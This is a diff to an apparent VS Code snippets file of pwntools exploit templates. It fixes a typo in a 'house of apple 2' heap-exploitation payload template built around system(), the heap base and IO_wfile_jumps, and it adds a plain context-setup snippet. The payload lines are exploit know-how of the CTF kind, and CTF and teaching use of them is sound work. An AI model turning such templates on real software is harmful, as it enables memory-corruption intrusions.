@@ -15,7 +15,7 @@
       "    payload+= b\"\\x00\"*0x38 + p64(sys_addr) + b\"\\x00\"*0x30 + p64(heap_base+0x0) # payload头地址",
       "    payload+= b\"\\x00\"*0x30+ p64(io_wfile_jumps)",
       "    payload+= p64(heap_base+0x0) # payload头地址",
-      "    retrun payload"
+      "    return payload"
     ],
     "description": "pwntools' house of apple 2 template (No sandbox)"
   },
@@ -111,5 +111,20 @@
       "itr()"
     ],
     "description": "pwntools file init template"
+  },
+  "[pocwriter] pwntools context setup": {
+    "scope": "python",
+    "prefix": [
+      "context(arch=",
+      "pwntools context"
+    ],
+    "body": [
+      "from pwn import context",
+      "",
+      "context.clear()",
+      "context(arch='${1:amd64}', os='${2:linux}', log_level='${3:info}')",
+      "$0"
+    ],
+    "description": "pwntools context setup"
   }
 }
